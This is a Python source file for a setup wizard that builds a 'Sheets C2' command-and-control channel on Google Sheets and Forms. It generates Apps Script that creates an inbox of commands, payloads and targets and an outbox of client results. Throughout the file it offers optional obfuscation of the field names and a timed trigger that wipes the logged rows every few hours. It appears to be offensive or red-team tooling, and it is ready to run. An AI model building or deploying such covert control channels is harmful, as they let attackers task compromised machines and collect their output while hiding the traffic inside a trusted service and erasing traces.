import json
import re
import sys

from wizard.channel.base import WizardChannel
from wizard import core

INBOX_FIELDS  = ["command_id", "command", "payload", "target", "status", "created_at"]
OUTBOX_FIELDS = ["command_id", "client_id", "status", "result", "timestamp"]


def _display_names(fields, col_map):
    """Return {logical: display_name} — obfuscated name if map set, else logical name."""
    return {f: col_map.get(f, f) for f in fields}


def _normalize_forms_url(url):
    """Accept /viewform or /formResponse URL, always return /formResponse."""
    url = url.strip().rstrip("/")
    if url.endswith("/viewform"):
        url = url[:-len("/viewform")] + "/formResponse"
    elif not url.endswith("/formResponse"):
        url += "/formResponse"
    return url


def _validate_gid(v):
    if not v.isdigit():
        return "GID must be numeric — copy the ?gid= value from the URL"


def _validate_url(v):
    if not v.startswith("https://"):
        return "Must be a valid HTTPS URL"


def _validate_entry_id(v):
    if not re.match(r"^entry\.\d+$", v):
        return "Must be in the format entry.123456789"


def _collect_entry_ids(fields, display):
    """Prompt for an entry ID for each field. display: {logical: shown_name}."""
    core.info("Open the form preview in your browser, right-click → View Page Source,")
    core.info("then search for 'entry.' to locate each field's ID.")
    core.info()
    field_map = {}
    for field in fields:
        field_map[field] = core.ask(
            f"entry ID for '{display[field]}'",
            validator=_validate_entry_id,
        )
    return field_map


# ── Script generation ─────────────────────────────────────────────────────────

def _build_setup_script(inbox_display, outbox_display, name="Sheets C2"):
    """Generate the Apps Script setup script with field names baked in."""
    inbox_logical   = json.dumps(INBOX_FIELDS)
    inbox_display_  = json.dumps([inbox_display[f]  for f in INBOX_FIELDS])
    outbox_logical  = json.dumps(OUTBOX_FIELDS)
    outbox_display_ = json.dumps([outbox_display[f] for f in OUTBOX_FIELDS])

    return f"""\
// sheets_c2_setup.gs
// Run the setup() function once. Copy the JSON from the execution log into the wizard.

function setup() {{
  var NAME = "{name}";

  // ── Spreadsheet ────────────────────────────────────────────────────────────
  var ss = SpreadsheetApp.create(NAME);
  var ssId = ss.getId();

  DriveApp.getFileById(ssId).setSharing(
    DriveApp.Access.ANYONE_WITH_LINK,
    DriveApp.Permission.VIEW
  );

  // ── Helpers ────────────────────────────────────────────────────────────────

  // Find the sheet added by setDestination by comparing before/after sheet IDs.
  function getAddedSheet(ss, idsBefore) {{
    SpreadsheetApp.flush();
    var sheets = ss.getSheets();
    for (var k = 0; k < sheets.length; k++) {{
      if (idsBefore.indexOf(sheets[k].getSheetId()) === -1) return sheets[k];
    }}
    return null;
  }}

  // Fetch the form HTML and extract entry IDs from the FB_PUBLIC_LOAD_DATA_
  // JSON blob embedded in a <script> tag. Each field's entry ID is at
  // field[4][0][0] in that structure. This is more reliable than searching
  // for entry.\d+ in rendered markup — Google Forms renders client-side so
  // UrlFetchApp never sees the input elements, but the data blob is always
  // present in the static HTML.
  function getEntryIds(form, logicalNames) {{
    var html = UrlFetchApp.fetch(form.getPublishedUrl()).getContentText();
    var marker = 'FB_PUBLIC_LOAD_DATA_ = ';
    var start = html.indexOf(marker) + marker.length;
    var end = html.indexOf(';</script>', start);
    if (start < marker.length || end === -1) {{
      throw new Error("FB_PUBLIC_LOAD_DATA_ not found — form may not be published yet");
    }}
    var data = JSON.parse(html.substring(start, end));
    var fields = data[1][1];
    var result = {{}};
    logicalNames.forEach(function(name, i) {{
      result[name] = fields[i] ? ("entry." + fields[i][4][0][0]) : "";
    }});
    return result;
  }}

  // ── Inbox form ─────────────────────────────────────────────────────────────
  var inboxLogical = {inbox_logical};
  var inboxDisplay = {inbox_display_};
  var inboxForm = FormApp.create(NAME + " Inbox");
  inboxForm.setCollectEmail(false);
  for (var i = 0; i < inboxDisplay.length; i++) {{
    inboxForm.addTextItem().setTitle(inboxDisplay[i]);
  }}
  var idsBefore1 = ss.getSheets().map(function(s) {{ return s.getSheetId(); }});
  inboxForm.setDestination(FormApp.DestinationType.SPREADSHEET, ssId);
  var inboxSheet = getAddedSheet(ss, idsBefore1);
  inboxSheet.setName("inbox");
  var inboxGid = inboxSheet.getSheetId();
  var inboxEntryIds = getEntryIds(inboxForm, inboxLogical);
  var inboxFormUrl = inboxForm.getPublishedUrl().replace("/viewform", "/formResponse");

  // ── Outbox form ────────────────────────────────────────────────────────────
  var outboxLogical = {outbox_logical};
  var outboxDisplay = {outbox_display_};
  var outboxForm = FormApp.create(NAME + " Outbox");
  outboxForm.setCollectEmail(false);
  for (var j = 0; j < outboxDisplay.length; j++) {{
    outboxForm.addTextItem().setTitle(outboxDisplay[j]);
  }}
  var idsBefore2 = ss.getSheets().map(function(s) {{ return s.getSheetId(); }});
  outboxForm.setDestination(FormApp.DestinationType.SPREADSHEET, ssId);
  var outboxSheet = getAddedSheet(ss, idsBefore2);
  outboxSheet.setName("outbox");
  var outboxGid = outboxSheet.getSheetId();
  var outboxEntryIds = getEntryIds(outboxForm, outboxLogical);
  var outboxFormUrl = outboxForm.getPublishedUrl().replace("/viewform", "/formResponse");

  // ── Remove default blank sheet ─────────────────────────────────────────────
  var blank = ss.getSheetByName("Sheet1");
  if (blank) ss.deleteSheet(blank);

  // ── Output ─────────────────────────────────────────────────────────────────
  var result = {{
    SPREADSHEET_ID:        ssId,
    INBOX_GID:             inboxGid,
    OUTBOX_GID:            outboxGid,
    INBOX_FORMS_URL:       inboxFormUrl,
    INBOX_FORMS_FIELD_MAP: JSON.stringify(inboxEntryIds),
    FORMS_URL:             outboxFormUrl,
    FORMS_FIELD_MAP:       JSON.stringify(outboxEntryIds)
  }};

  Logger.log("=== COPY THIS JSON ===");
  Logger.log(JSON.stringify(result, null, 2));
  Logger.log("=== END JSON ===");
}}
"""


def _build_cleanup_script(spreadsheet_id, inbox_gid, outbox_gid, cleanup_hours=6):
    """Generate the Apps Script cleanup script with IDs baked in."""
    return f"""\
// sheets_c2_cleanup.gs
// Clears all data rows (keeps header row 1) from inbox and outbox tabs.
//
// Manual run : call cleanupAll() from the Apps Script editor.
// Automated  : call installTrigger() once to run cleanupAll every {cleanup_hours} hours.
//              Call removeTrigger() to disable.

var SPREADSHEET_ID     = "{spreadsheet_id}";
var INBOX_GID          = {inbox_gid};
var OUTBOX_GID         = {outbox_gid};
var CLEANUP_EVERY_HOURS = {cleanup_hours};


function _clearSheet(gid) {{
  var ss    = SpreadsheetApp.openById(SPREADSHEET_ID);
  var sheet = ss.getSheets().filter(function(s) {{ return s.getSheetId() === gid; }})[0];
  if (!sheet) {{
    Logger.log("Sheet with GID " + gid + " not found");
    return 0;
  }}
  var lastRow = sheet.getLastRow();
  if (lastRow > 1) {{
    sheet.deleteRows(2, lastRow - 1);
    Logger.log(sheet.getName() + ": cleared " + (lastRow - 1) + " row(s)");
    return lastRow - 1;
  }}
  Logger.log(sheet.getName() + ": already empty");
  return 0;
}}

function cleanupInbox()  {{ _clearSheet(INBOX_GID);  }}
function cleanupOutbox() {{ _clearSheet(OUTBOX_GID); }}
function cleanupAll()    {{ cleanupInbox(); cleanupOutbox(); }}

function installTrigger() {{
  // Remove any existing cleanup triggers first
  ScriptApp.getProjectTriggers().forEach(function(t) {{
    if (t.getHandlerFunction() === "cleanupAll") ScriptApp.deleteTrigger(t);
  }});
  ScriptApp.newTrigger("cleanupAll")
    .timeBased()
    .everyHours(CLEANUP_EVERY_HOURS)
    .create();
  Logger.log("Cleanup trigger installed — runs every " + CLEANUP_EVERY_HOURS + " hour(s)");
}}

function removeTrigger() {{
  var removed = 0;
  ScriptApp.getProjectTriggers().forEach(function(t) {{
    if (t.getHandlerFunction() === "cleanupAll") {{
      ScriptApp.deleteTrigger(t);
      removed++;
    }}
  }});
  Logger.log(removed ? "Cleanup trigger removed" : "No cleanup trigger found");
}}
"""


def _collect_json_output():
    """Prompt user to paste JSON from Apps Script execution log. Returns parsed dict."""
    core.info("Paste the JSON from the Apps Script execution log.")
    core.info("Enter a blank line when done.")
    core.info()
    lines = []
    while True:
        try:
            line = input()
        except (EOFError, KeyboardInterrupt):
            print()
            sys.exit(0)
        if not line.strip():
            break
        lines.append(line)

    raw = "\n".join(lines)
    # Strip any === markers, find JSON boundaries
    start = raw.find("{")
    end   = raw.rfind("}") + 1
    if start == -1 or end == 0:
        return None
    try:
        return json.loads(raw[start:end])
    except json.JSONDecodeError:
        return None


# ── Wizard ────────────────────────────────────────────────────────────────────

class SheetsWizard(WizardChannel):
    @property
    def name(self):
        return "sheets"

    def setup(self, obfuscation):
        """Route to auto or manual setup based on user choice."""
        core.info("Choose setup method:")
        mode = core.ask_choice("", {
            "auto":   "Automated — generate an Apps Script, run it once in browser",
            "manual": "Manual    — step-by-step browser instructions",
        })
        print()
        if mode == "auto":
            return self._auto_setup(obfuscation)
        return self._manual_setup(obfuscation)

    # ── Auto setup ────────────────────────────────────────────────────────────

    def _auto_setup(self, obfuscation):
        inbox_map   = obfuscation.get("inbox",  {})
        outbox_map  = obfuscation.get("outbox", {})
        inbox_disp  = _display_names(INBOX_FIELDS,  inbox_map)
        outbox_disp = _display_names(OUTBOX_FIELDS, outbox_map)

        name = core.ask_optional("Spreadsheet name (default: Sheets C2)") or "Sheets C2"

        # ── Setup script ──────────────────────────────────────────────────────
        setup_script = _build_setup_script(inbox_disp, outbox_disp, name)
        with open("sheets_c2_setup.gs", "w") as f:
            f.write(setup_script)

        core.info()
        core.info("Setup script written to:  sheets_c2_setup.gs")
        core.info()
        core.info("Run it in Google Apps Script:")
        core.info("  1. Go to https://script.google.com — create a new project")
        core.info("  2. Replace the default code with the contents of sheets_c2_setup.gs")
        core.info("  3. Click Run → setup")
        core.info("  4. Grant permissions when prompted")
        core.info("  5. Open View → Execution log")
        core.info("  6. Copy everything between === COPY THIS JSON === and === END JSON ===")
        core.pause("Press Enter once you have the JSON ready to paste")

        # ── Parse JSON output ─────────────────────────────────────────────────
        parsed = None
        while parsed is None:
            parsed = _collect_json_output()
            if parsed is None:
                core.warn("Could not parse JSON — try again")

        required = ["SPREADSHEET_ID", "INBOX_GID", "OUTBOX_GID",
                    "INBOX_FORMS_URL", "INBOX_FORMS_FIELD_MAP",
                    "FORMS_URL", "FORMS_FIELD_MAP"]
        missing = [k for k in required if k not in parsed]
        if missing:
            core.warn(f"JSON is missing keys: {missing}")
            core.warn("Something may have gone wrong in the script — check the execution log.")

        env = {k: str(v) for k, v in parsed.items() if k in required}
        env["CHANNEL"] = "sheets"

        if inbox_map:
            env["INBOX_COLUMN_MAP"]  = json.dumps(inbox_map)
        if outbox_map:
            env["OUTBOX_COLUMN_MAP"] = json.dumps(outbox_map)

        core.success("Spreadsheet and forms configured")

        return env

    # ── Manual setup ──────────────────────────────────────────────────────────

    def _manual_setup(self, obfuscation):
        env = {}
        inbox_map  = obfuscation.get("inbox",  {})
        outbox_map = obfuscation.get("outbox", {})

        # ── Spreadsheet ───────────────────────────────────────────────────────
        core.section("Google Sheets — Spreadsheet")
        core.info("1. Go to https://sheets.google.com and create a new spreadsheet.")
        core.info("2. Share it:")
        core.info("     Share → General access → Anyone with the link → Viewer")
        core.info("3. Copy the spreadsheet ID from the URL:")
        core.info("     https://docs.google.com/spreadsheets/d/<SPREADSHEET_ID>/edit")
        core.pause()

        def _validate_sid(v):
            if len(v) < 20:
                return "Spreadsheet ID looks too short — check the URL"

        env["SPREADSHEET_ID"] = core.ask("Spreadsheet ID", validator=_validate_sid)

        # ── Inbox tab + Inbox Form ────────────────────────────────────────────
        core.section("Google Sheets — Inbox Tab + Form")
        inbox_display = _display_names(INBOX_FIELDS, inbox_map)
        col_list = "  " + ",  ".join(inbox_display.values())

        core.info("Create the inbox tab:")
        core.info("  1. Rename 'Sheet1' to 'inbox' (or any name you prefer).")
        core.info("  2. Add these column headers in row 1:")
        core.info(col_list)
        core.info()
        core.info("Create and link the inbox form:")
        core.info("  3. Go to https://forms.google.com, create a new form.")
        core.info("  4. Add one Short answer question per column, using the same names as above.")
        core.info("  5. Responses tab → Link to Sheets → select your spreadsheet → inbox tab.")
        core.info("  Note: linking may create a new tab. Check the ?gid= after linking.")
        core.pause()

        env["INBOX_GID"] = core.ask("Inbox tab GID (from ?gid= in URL)", validator=_validate_gid)

        inbox_forms_url = core.ask("Inbox form URL (viewform or formResponse)", validator=_validate_url)
        env["INBOX_FORMS_URL"] = _normalize_forms_url(inbox_forms_url)

        core.info()
        inbox_entry_ids = _collect_entry_ids(INBOX_FIELDS, inbox_display)
        env["INBOX_FORMS_FIELD_MAP"] = json.dumps(inbox_entry_ids)

        if inbox_map:
            env["INBOX_COLUMN_MAP"] = json.dumps(inbox_map)

        # ── Outbox tab + Outbox Form ──────────────────────────────────────────
        core.section("Google Sheets — Outbox Tab + Form")
        outbox_display = _display_names(OUTBOX_FIELDS, outbox_map)
        col_list = "  " + ",  ".join(outbox_display.values())

        core.info("Create the outbox tab:")
        core.info("  1. Add a new tab, name it 'outbox'.")
        core.info("  2. Add these column headers in row 1:")
        core.info(col_list)
        core.info()
        core.info("Create and link the outbox form:")
        core.info("  3. Create a new form at https://forms.google.com.")
        core.info("  4. Add one Short answer question per column, using the same names as above.")
        core.info("  5. Responses tab → Link to Sheets → select your spreadsheet → outbox tab.")
        core.info("  Note: linking may create a new tab. Check the ?gid= after linking.")
        core.pause()

        env["OUTBOX_GID"] = core.ask("Outbox tab GID (from ?gid= in URL)", validator=_validate_gid)

        forms_url = core.ask("Outbox form URL (viewform or formResponse)", validator=_validate_url)
        env["FORMS_URL"] = _normalize_forms_url(forms_url)

        core.info()
        outbox_entry_ids = _collect_entry_ids(OUTBOX_FIELDS, outbox_display)
        env["FORMS_FIELD_MAP"] = json.dumps(outbox_entry_ids)

        if outbox_map:
            env["OUTBOX_COLUMN_MAP"] = json.dumps(outbox_map)

        env["CHANNEL"] = "sheets"
        return env
